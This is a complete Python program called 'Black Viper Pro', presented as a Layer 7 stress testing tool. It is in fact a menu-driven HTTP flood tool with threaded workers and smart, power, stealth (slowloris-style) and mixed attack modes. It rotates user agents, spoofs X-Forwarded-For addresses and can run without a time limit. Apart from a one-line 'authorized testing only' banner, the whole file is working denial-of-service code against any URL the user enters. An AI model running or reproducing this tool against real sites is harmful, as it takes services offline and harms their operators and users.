#!/usr/bin/env python3
"""
██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██╗   ██╗██╗██████╗ ███████╗██████╗     ██████╗ ██████╗  ██████╗ 
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██║██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗
██████╔╝██║     ███████║██║     █████╔╝     ██║   ██║██║██████╔╝█████╗  ██████╔╝    ██████╔╝██████╔╝██║   ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ╚██╗ ██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══██╗██║   ██║
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗     ╚████╔╝ ██║██║     ███████╗██║  ██║    ██║     ██║  ██║╚██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
"""

import socket
import ssl
import random
import threading
import time
import urllib.parse
import http.client
import os
import sys
import json
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum

class Color:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class AttackMode(Enum):
    SMART = "smart"
    POWER = "power"
    STEALTH = "stealth"
    MIXED = "mixed"

@dataclass
class Target:
    url: str
    host: str
    ip: str
    port: int
    ssl: bool
    path: str
    
    @classmethod
    def from_url(cls, url: str):
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        ssl = parsed.scheme == 'https'
        path = parsed.path if parsed.path else '/'
        
        try:
            ip = socket.gethostbyname(host)
        except:
            ip = host
        
        return cls(url=url, host=host, ip=ip, port=port, ssl=ssl, path=path)

class ViperCore:
    def __init__(self):
        self.target = None
        self.attack_mode = AttackMode.SMART
        self.running = False
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'bytes_sent': 0,
            'start_time': 0
        }
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        
        self.accept_headers = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json, text/plain, */*',
            'text/css,*/*;q=0.1',
            '*/*',
        ]
    
    def display_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Color.GREEN}{Color.BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║                      {Color.CYAN}⚡ BLACK VIPER PRO ⚡{Color.GREEN}                         ║
║                 Advanced Layer 7 Stress Testing Tool                 ║
║                    Version 3.0 | Professional Edition                ║
╚══════════════════════════════════════════════════════════════════════╝{Color.END}

{Color.YELLOW}[!] For authorized testing only. Use responsibly.{Color.END}
""")
    
    def display_menu(self):
        print(f"\n{Color.CYAN}{Color.BOLD}MAIN MENU{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        print(f"  {Color.WHITE}1.{Color.END} {Color.GREEN}Smart Attack    {Color.YELLOW}(Balanced & Intelligent){Color.END}")
        print(f"  {Color.WHITE}2.{Color.END} {Color.RED}Power Attack    {Color.YELLOW}(Maximum Resource Usage){Color.END}")
        print(f"  {Color.WHITE}3.{Color.END} {Color.BLUE}Stealth Attack  {Color.YELLOW}(Low & Slow Approach){Color.END}")
        print(f"  {Color.WHITE}4.{Color.END} {Color.MAGENTA}Mixed Attack    {Color.YELLOW}(All Methods Combined){Color.END}")
        print(f"  {Color.WHITE}5.{Color.END} {Color.WHITE}Settings & Config{Color.END}")
        print(f"  {Color.WHITE}6.{Color.END} {Color.WHITE}Exit{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
    
    def get_target(self):
        print(f"\n{Color.CYAN}{Color.BOLD}TARGET CONFIGURATION{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        
        url = input(f"{Color.WHITE}Enter Target URL: {Color.GREEN}").strip()
        print(Color.END, end='')
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        try:
            self.target = Target.from_url(url)
            self.display_target_info()
            return True
        except Exception as e:
            print(f"{Color.RED}Error: Invalid URL - {e}{Color.END}")
            return False
    
    def display_target_info(self):
        print(f"\n{Color.CYAN}{Color.BOLD}TARGET INFORMATION{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        print(f"  {Color.WHITE}URL:{Color.END} {Color.GREEN}{self.target.url}{Color.END}")
        print(f"  {Color.WHITE}Host:{Color.END} {Color.CYAN}{self.target.host}{Color.END}")
        print(f"  {Color.WHITE}IP Address:{Color.END} {Color.YELLOW}{self.target.ip}{Color.END}")
        print(f"  {Color.WHITE}Port:{Color.END} {Color.BLUE}{self.target.port}{Color.END}")
        print(f"  {Color.WHITE}SSL/TLS:{Color.END} {Color.GREEN if self.target.ssl else Color.RED}{self.target.ssl}{Color.END}")
        print(f"  {Color.WHITE}Path:{Color.END} {Color.MAGENTA}{self.target.path}{Color.END}")
    
    def configure_attack(self):
        print(f"\n{Color.CYAN}{Color.BOLD}ATTACK CONFIGURATION{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        
        try:
            workers = int(input(f"{Color.WHITE}Number of Workers [1-100]: {Color.GREEN}") or "30")
            workers = max(1, min(100, workers))
            print(Color.END, end='')
            
            duration = int(input(f"{Color.WHITE}Attack Duration (seconds) [0=unlimited]: {Color.GREEN}") or "60")
            print(Color.END, end='')
            
            return workers, duration
        except:
            return 30, 60
    
    def generate_headers(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice(self.accept_headers),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if random.random() > 0.5:
            headers['Referer'] = f'https://{self.target.host}/'
        
        if random.random() > 0.7:
            headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        
        return headers
    
    def smart_worker(self, worker_id: int):
        while self.running:
            try:
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if self.target.ssl:
                    conn = http.client.HTTPSConnection(self.target.host, timeout=3)
                else:
                    conn = http.client.HTTPConnection(self.target.host, timeout=3)
                
                headers = self.generate_headers()
                
                if method == 'GET':
                    path = f"{self.target.path}?_={int(time.time()*1000)}"
                    conn.request("GET", path, headers=headers)
                elif method == 'POST':
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    post_data = f"data={random.randint(1000,9999)}"
                    conn.request("POST", self.target.path, body=post_data, headers=headers)
                else:
                    conn.request("HEAD", self.target.path, headers=headers)
                
                response = conn.getresponse()
                response.read(512)
                conn.close()
                
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    if response.status < 500:
                        self.stats['successful'] += 1
                    else:
                        self.stats['failed'] += 1
                
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
                time.sleep(0.5)
    
    def power_worker(self, worker_id: int):
        while self.running:
            try:
                sock = socket.create_connection((self.target.ip, self.target.port), timeout=2)
                
                if self.target.ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target.host)
                
                request = f"GET {self.target.path} HTTP/1.1\r\n"
                request += f"Host: {self.target.host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                try:
                    sock.recv(1024)
                except:
                    pass
                sock.close()
                
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['successful'] += 1
                
            except:
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
    
    def stealth_worker(self, worker_id: int):
        while self.running:
            try:
                sock = socket.create_connection((self.target.ip, self.target.port), timeout=10)
                
                if self.target.ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target.host)
                
                request_lines = [
                    f"GET {self.target.path}?slow={random.randint(1,1000)} HTTP/1.1\r\n",
                    f"Host: {self.target.host}\r\n",
                    f"User-Agent: {random.choice(self.user_agents)}\r\n",
                    f"Accept: {random.choice(self.accept_headers)}\r\n",
                    "Connection: keep-alive\r\n",
                ]
                
                for line in request_lines:
                    sock.send(line.encode())
                    time.sleep(random.uniform(1, 3))
                
                sock.send("\r\n".encode())
                
                try:
                    sock.settimeout(2)
                    sock.recv(512)
                except:
                    pass
                
                sock.close()
                
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['successful'] += 1
                
                time.sleep(random.uniform(2, 5))
                
            except:
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
                time.sleep(1)
    
    def mixed_worker(self, worker_id: int):
        methods = [self.smart_attack, self.power_attack, self.stealth_attack]
        
        while self.running:
            try:
                attack_func = random.choice(methods)
                success = attack_func()
                
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    if success:
                        self.stats['successful'] += 1
                    else:
                        self.stats['failed'] += 1
                
                time.sleep(random.uniform(0.05, 0.2))
                
            except:
                with threading.Lock():
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
                time.sleep(0.3)
    
    def smart_attack(self):
        try:
            if self.target.ssl:
                conn = http.client.HTTPSConnection(self.target.host, timeout=3)
            else:
                conn = http.client.HTTPConnection(self.target.host, timeout=3)
            
            headers = self.generate_headers()
            path = f"{self.target.path}?_={int(time.time()*1000)}"
            
            conn.request("GET", path, headers=headers)
            response = conn.getresponse()
            response.read(256)
            conn.close()
            
            return response.status < 500
        except:
            return False
    
    def power_attack(self):
        try:
            sock = socket.create_connection((self.target.ip, self.target.port), timeout=1)
            
            if self.target.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target.host)
            
            request = f"GET {self.target.path} HTTP/1.1\r\nHost: {self.target.host}\r\n\r\n"
            sock.send(request.encode())
            sock.close()
            
            return True
        except:
            return False
    
    def stealth_attack(self):
        try:
            sock = socket.create_connection((self.target.ip, self.target.port), timeout=5)
            
            if self.target.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target.host)
            
            sock.send(f"GET {self.target.path} ".encode())
            time.sleep(0.5)
            sock.send(f"HTTP/1.1\r\nHost: {self.target.host}\r\n".encode())
            time.sleep(0.5)
            sock.send("Connection: keep-alive\r\n\r\n".encode())
            
            sock.close()
            return True
        except:
            return False
    
    def start_attack(self, mode: AttackMode, workers: int, duration: int):
        self.attack_mode = mode
        self.running = True
        self.stats = {'total_requests': 0, 'successful': 0, 'failed': 0, 'bytes_sent': 0, 'start_time': time.time()}
        
        mode_names = {
            AttackMode.SMART: "Smart",
            AttackMode.POWER: "Power", 
            AttackMode.STEALTH: "Stealth",
            AttackMode.MIXED: "Mixed"
        }
        
        print(f"\n{Color.CYAN}{Color.BOLD}STARTING ATTACK{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        print(f"  {Color.WHITE}Mode:{Color.END} {Color.GREEN}{mode_names[mode]} Attack{Color.END}")
        print(f"  {Color.WHITE}Workers:{Color.END} {Color.CYAN}{workers}{Color.END}")
        print(f"  {Color.WHITE}Duration:{Color.END} {Color.YELLOW}{duration if duration > 0 else 'Unlimited'} seconds{Color.END}")
        print(f"  {Color.WHITE}Target:{Color.END} {Color.MAGENTA}{self.target.url}{Color.END}")
        print(f"\n{Color.YELLOW}Press Ctrl+C to stop the attack...{Color.END}")
        
        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
        stats_thread.start()
        
        try:
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = []
                
                for i in range(workers):
                    if mode == AttackMode.SMART:
                        future = executor.submit(self.smart_worker, i)
                    elif mode == AttackMode.POWER:
                        future = executor.submit(self.power_worker, i)
                    elif mode == AttackMode.STEALTH:
                        future = executor.submit(self.stealth_worker, i)
                    else:
                        future = executor.submit(self.mixed_worker, i)
                    futures.append(future)
                
                if duration > 0:
                    time.sleep(duration)
                    self.running = False
                else:
                    while self.running:
                        time.sleep(1)
                
                for future in futures:
                    try:
                        future.result(timeout=2)
                    except:
                        pass
                        
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Color.YELLOW}Attack stopped by user.{Color.END}")
        
        self.display_final_stats()
    
    def display_stats(self):
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                rps = self.stats['total_requests'] / elapsed
                success_rate = (self.stats['successful'] / self.stats['total_requests'] * 100) if self.stats['total_requests'] > 0 else 0
                
                print(f"\r{Color.CYAN}↻ {Color.GREEN}REQ: {self.stats['total_requests']} | "
                      f"{Color.YELLOW}RPS: {rps:.1f} | "
                      f"{Color.GREEN if success_rate > 70 else Color.YELLOW if success_rate > 30 else Color.RED}OK: {success_rate:.1f}% | "
                      f"{Color.BLUE}TIME: {int(elapsed)}s{Color.END}", end='', flush=True)
            
            time.sleep(1)
    
    def display_final_stats(self):
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
        success_rate = (self.stats['successful'] / self.stats['total_requests'] * 100) if self.stats['total_requests'] > 0 else 0
        
        print(f"\n\n{Color.CYAN}{Color.BOLD}FINAL STATISTICS{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        print(f"  {Color.WHITE}Duration:{Color.END} {Color.CYAN}{elapsed:.1f} seconds{Color.END}")
        print(f"  {Color.WHITE}Total Requests:{Color.END} {Color.GREEN}{self.stats['total_requests']:,}{Color.END}")
        print(f"  {Color.WHITE}Successful:{Color.END} {Color.GREEN}{self.stats['successful']:,}{Color.END}")
        print(f"  {Color.WHITE}Failed:{Color.END} {Color.RED}{self.stats['failed']:,}{Color.END}")
        print(f"  {Color.WHITE}Requests/Second:{Color.END} {Color.YELLOW}{rps:.1f}{Color.END}")
        print(f"  {Color.WHITE}Success Rate:{Color.END} {Color.GREEN if success_rate > 70 else Color.YELLOW if success_rate > 30 else Color.RED}{success_rate:.1f}%{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
    
    def show_settings(self):
        print(f"\n{Color.CYAN}{Color.BOLD}SETTINGS{Color.END}")
        print(f"{Color.GREEN}⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺{Color.END}")
        print(f"  {Color.WHITE}User Agents:{Color.END} {len(self.user_agents)}")
        print(f"  {Color.WHITE}Accept Headers:{Color.END} {len(self.accept_headers)}")
        print(f"  {Color.WHITE}Current Target:{Color.END} {self.target.url if self.target else 'None'}")
        print(f"\n{Color.YELLOW}Settings menu coming soon...{Color.END}")
        input(f"\n{Color.WHITE}Press Enter to continue...{Color.END}")
    
    def run(self):
        self.display_banner()
        
        while True:
            self.display_menu()
            
            try:
                choice = input(f"\n{Color.WHITE}Select option: {Color.GREEN}").strip()
                print(Color.END, end='')
                
                if choice == "1":
                    if self.get_target():
                        workers, duration = self.configure_attack()
                        self.start_attack(AttackMode.SMART, workers, duration)
                
                elif choice == "2":
                    if self.get_target():
                        workers, duration = self.configure_attack()
                        self.start_attack(AttackMode.POWER, workers, duration)
                
                elif choice == "3":
                    if self.get_target():
                        workers, duration = self.configure_attack()
                        self.start_attack(AttackMode.STEALTH, workers, duration)
                
                elif choice == "4":
                    if self.get_target():
                        workers, duration = self.configure_attack()
                        self.start_attack(AttackMode.MIXED, workers, duration)
                
                elif choice == "5":
                    self.show_settings()
                
                elif choice == "6":
                    print(f"\n{Color.GREEN}Thank you for using Black Viper Pro!{Color.END}")
                    sys.exit(0)
                
                else:
                    print(f"{Color.RED}Invalid choice!{Color.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Color.YELLOW}Exiting...{Color.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Color.RED}Error: {e}{Color.END}")

def main():
    if sys.version_info < (3, 7):
        print(f"{Color.RED}Python 3.7 or higher is required!{Color.END}")
        sys.exit(1)
    
    viper = ViperCore()
    viper.run()

if __name__ == "__main__":
    main()
